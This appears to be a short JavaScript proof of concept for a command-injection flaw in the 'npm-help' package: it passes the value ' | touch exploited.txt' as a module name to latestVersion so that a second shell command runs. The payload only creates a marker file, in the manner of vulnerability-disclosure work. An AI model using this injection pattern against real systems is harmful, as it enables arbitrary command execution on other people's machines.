const pkg = require('npm-help');

const target_module = " | touch exploited.txt";

pkg.latestVersion(target_module);

console.log(pkg);